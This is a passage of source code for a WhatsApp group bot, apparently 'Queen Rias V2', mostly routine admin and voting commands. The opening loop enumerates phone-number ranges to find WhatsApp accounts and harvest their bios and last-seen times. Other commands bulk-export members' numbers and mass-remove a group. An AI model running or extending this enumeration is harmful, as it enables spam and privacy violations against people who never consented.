        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await ToxxicTechInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await ToxxicTechInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/Lagos').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        newReply(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return LorenzoStickGroup()
if (!(isGroupAdmins || isCreator)) return LorenzoStickAdmin()
Lorenzobigpp = await ToxxicTechInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
ToxxicTechInc.sendContact(m.chat, participants.map(a => a.id), Lorenzobigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return LorenzoStickGroup()
if (!(isGroupAdmins || isCreator)) return LorenzoStickAdmin()
let cmiggc = await ToxxicTechInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
newReply('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ToxxicTechInc.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return LorenzoStickGroup()
if (!m.mentionedJid[0]) return newReply('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
ToxxicTechInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return LorenzoStickGroup()
if (!(isGroupAdmins || isCreator)) return LorenzoStickAdmin()
if (!m.mentionedJid[0]) return newReply('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
ToxxicTechInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return LorenzoStickGroup()
                if(!isCreator) return ownernya()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ToxxicTechInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                newReply(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ToxxicTechInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                newReply(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ToxxicTechInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                newReply(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (!text) return newReply('Text ?')
                await ToxxicTechInc.groupUpdateSubject(m.chat, text)
                newReply(mess.done)
                break
                case 'userjid':{
          	if(!isCreator) return ownernya()
        const groupMetadata = m.isGroup ? await ToxxicTechInc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      newReply(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!isCreator) return ownernya()
if (!args.join(" ")) return newReply(`Use ${prefix+command} groupname`)
try {
let cret = await ToxxicTechInc.groupCreate(args.join(" "), [])
let response = await ToxxicTechInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
ToxxicTechInc.sendMessage(m.chat, { text:teksop, mentions: await ToxxicTechInc.parseMention(teksop)}, {quoted:m})
} catch {
	newReply(`Error`)
	}
}
break
    case 'setbotbio':{
if (!isCreator) return ownernya()
if (!text) return newReply(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await ToxxicTechInc.updateProfileStatus(text)
    newReply(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return LorenzoStickGroup()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
if (!isBotAdmins) return LorenzoStickBotAdmin()
    await ToxxicTechInc.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!isCreator) return ownernya()
    await ToxxicTechInc.removeProfilePicture(ToxxicTechInc.user.id)
    newReply(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (!text) return newReply('Text ?')
                await ToxxicTechInc.groupUpdateDescription(m.chat, text)
                newReply(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins) return newReply(mess.admin)
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return newReply(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ToxxicTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                } else {
                    var memeg = await ToxxicTechInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                }
                break
            case 'tagall':
            case 'tag':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                let me = m.sender
                let teks = `〔˙·٠${themeemoji}●♥ 𝐓𝐚𝐠 𝐀𝐥𝐥♥●${themeemoji}٠·˙〕\n😶 *𝐓𝐚𝐠𝐠𝐞𝐫 :*  @${me.split('@')[0]}\n🌿 *𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                ToxxicTechInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'kickall': {
 if (!m.isGroup) return LorenzoStickGroup()
 if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
 if (!isBotAdmins) return LorenzoStickBotAdmin()
  const Lorenzokickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of Lorenzokickall) {
 await ToxxicTechInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 newReply(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return LorenzoStickGroup()
 if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
 if (!isBotAdmins) return LorenzoStickBotAdmin()
  const Lorenzopromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of Lorenzopromoteall) {
 await ToxxicTechInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 newReply(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return LorenzoStickGroup()
 if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
 if (!isBotAdmins) return LorenzoStickBotAdmin()
  const Lorenzodemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of Lorenzodemoteall) {
 await ToxxicTechInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 newReply(`Success`);
}
break
            case 'hidetag':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                ToxxicTechInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (!isAdmins) return newReply(mess.admin)
                if (!m.quoted) return newReply(`Reply media with caption ${prefix + command}`)
                ToxxicTechInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':{
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (args[0] === 'close') {
                    await ToxxicTechInc.groupSettingUpdate(m.chat, 'announcement').then((res) => newReply(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await ToxxicTechInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => newReply(`Success Opening Group`))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                }
            break
            case 'editinfo':{
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (args[0] === 'open') {
                    await ToxxicTechInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => newReply(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await ToxxicTechInc.groupSettingUpdate(m.chat, 'locked').then((res) => newReply(`Successfully Closed Edit Group Info`))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                let response = await ToxxicTechInc.groupInviteCode(m.chat)
                ToxxicTechInc.sendText(m.chat, `👥 *𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊*\n📛 *𝐍𝐚𝐦𝐞 :* ${groupMetadata.subject}\n👤 *𝐆𝐫𝐨𝐮𝐩 𝐎𝐰𝐧𝐞𝐫:* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *𝐈𝐃 :* ${groupMetadata.id}\n🔗 *𝐂𝐡𝐚𝐭 𝐋𝐢𝐧𝐤:* https://chat.whatsapp.com/${response}\n👥 *𝐌𝐞𝐦𝐛𝐞𝐫:* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await ToxxicTechInc.fetchStatus(who)
    newReply(bio.status)
  } catch {
    if (text) return newReply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await ToxxicTechInc.fetchStatus(who)
      newReply(bio.status)
    } catch {
      return newReply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return LorenzoStickGroup()
            if (m.chat in vote) return newReply(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return newReply(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            newReply(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ToxxicTechInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return LorenzoStickGroup()
            if (!(m.chat in vote)) return newReply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return newReply('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ToxxicTechInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return LorenzoStickGroup()
            if (!(m.chat in vote)) return newReply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return newReply('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ToxxicTechInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return LorenzoStickGroup()
if (!(m.chat in vote)) return newReply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${ToxxicTechInc.user.id}
`
ToxxicTechInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return LorenzoStickGroup()
            if (!(m.chat in vote)) return newReply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            newReply('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                await ToxxicTechInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        newReply(`Reset Success`)
                    })
            break
                //bot status
              case 'ping': case 'botstatus': case 'statusbot': case 'p': {
    // React to the message with a gear emoji
    ToxxicTechInc.sendMessage(from, { react: { text: "⚙️", key: m.key } });

    // CPU information
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.values(cpu.times).reduce((last, type) => last + type, 0);
        return cpu;
    });
    
    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });

    // Latency and runtime
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let neww = performance.now();
    let oldd = performance.now();
    
    // Formatting the response message
    const respon = `
📊 *Queen Rias V2 Status* 📊
━━━━━━━━━━━━━━━━━━━━
⚙️ *Ping:* ${latensi.toFixed(4)} ms
⏱️ *Response Time:* ${(oldd - neww).toFixed(2)} ms
💾 *RAM Usage:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
🕒 *Uptime:* ${runtime(process.uptime())}
━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Send the response message with external ad reply
await ToxxicTechInc.sendMessage(m.chat, {
        text: respon,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname} Ping Status`,
                body: `Response time: ${latensi.toFixed(4)} ms`,
                thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',  // Placeholder image link
                sourceUrl: wagc,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;
  case 'repo': {
    // React to the incoming message with a document emoji
    ToxxicTechInc.sendMessage(from, { react: { text: "📄", key: m.key } });

    // Define the repository link
    const repoLink = 'https://api.github.com/repos/Toxic1239/Queen-RiasV2';

    // Fetch repository information from the GitHub API
    fetch(repoLink)
        .then(response => response.json())
        .then(repoData => {
            // Check if data was returned correctly
            if (!repoData || repoData.message === "Not Found") {
                return newReply('⚠️ Repository not found. Please check the link.');
            }

            // Format the repository information into a structured message
            const repoInfo = `
                🌟 *Queen RiasV2 Repository* 🌟
━━━━━━━━━━━━━━━━━━━━
📦 *Name:* ${repoData.name}
📝 *Description:* ${repoData.description || 'No description available'}
⭐ *Stars:* ${repoData.stargazers_count}
🍴 *Forks:* ${repoData.forks_count}
📜 *License:* ${repoData.license?.name || 'No license'}
🔗 *Link:* ${repoData.html_url}
━━━━━━━━━━━━━━━━━━━━
            `;

            // Send the formatted message
            ToxxicTechInc.sendMessage(m.chat, {
                text: repoInfo,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "Queen Rias V2 Repository",
                        body: "Click to view the repo",
                        thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
                        sourceUrl: repoData.html_url,
                        renderLargerThumbnail: true
                    }
                }
            }, {
                quoted: m
            });
        })
        .catch(err => {
            console.error('Error fetching repo data:', err);
            // Send a message if there's an error fetching data
            ToxxicTechInc.sendMessage(m.chat, {
                text: '⚠️ Unable to fetch repository data. Please try again later.'
            }, { quoted: m });
        });
}
break;
            case 'buypremium':
case 'premiumuser': {
    // React to the message with a crown emoji to indicate premium services
    ToxxicTechInc.sendMessage(from, { react: { text: "👑", key: m.key } });

    // Construct the premium purchase message with a more detailed and engaging format
    let premiumText = `🌟 *Hello, ${pushname}!* 🌟\n\n
    🔥 *Unlock Premium Features Now!* 🔥\n
    Get access to exclusive features by upgrading to premium. Reach out to the bot owner for more details:\n
    📞 *Contact Owner*: \`${prefix}owner\`\n\n
    💼 Premium users enjoy:\n
    1. Priority support 🚀\n
    2. Unlimited access to premium commands 💥\n
    3. Special privileges in all group chats 👑\n\n
    🔗 *Hurry, limited slots available!*`;

    // Send the formatted message with rich media preview
    await ToxxicTechInc.sendMessage(m.chat, {
        text: premiumText,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "Upgrade to Premium!",
                body: `Powered by Queen Rias • Managed by ${ownername}`,
                thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
                sourceUrl: wagc, // Link to WhatsApp group or other resource
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m // Quoting the original message for better context
    });
}
break;

case 'rentbot': {
    // React with a handshake emoji to indicate a rental option
    ToxxicTechInc.sendMessage(from, { react: { text: "🤝", key: m.key } });

    // Improved message for renting the bot
    let rentText = `🤖 *Interested in Renting This Bot?*\n\n
    You can now rent this bot for your own personal use, group management, or business automation!\n\n
    📞 *Contact the Owner*: \`${prefix}owner\`\n
    💬 *Tell them you're interested in renting* and they will provide you with more details on pricing and setup.\n\n
    *Don’t miss out on the opportunity to have your own automated assistant!*`;

    // Send the formatted message
    newReply(rentText);
}
break;
            case 'speedtest': case 'speedcheck': {
        ToxxicTechInc.sendMessage(from, { react: { text: "🏃‍♂", key: m.key } })

        m.reply(`Wait,Testing Speed... ⚙️`)
        let cp = require('child_process')
        let { promisify } = require('util')
        let exec = promisify(cp.exec).bind(cp)
        let o
        try {
          o = await exec('python speed.py')
        } catch (e) {
          o = e
        } finally {
          let { stdout, stderr } = o
          if (stdout.trim()) m.reply(stdout)
          if (stderr.trim()) m.reply(stderr)
        }
      }
        break;
   case 'runtime':
    let currentRuntime = runtime(process.uptime());
    let pinga = `╭━━━━━━━━━━━━━━━━━━━━━━━━━╮
│     𝐑𝐢𝐚𝐬 𝐆𝐫𝐞𝐦𝐨𝐫𝐲 𝐕𝟐 𝐑𝐮𝐧𝐭𝐢𝐦𝐞     
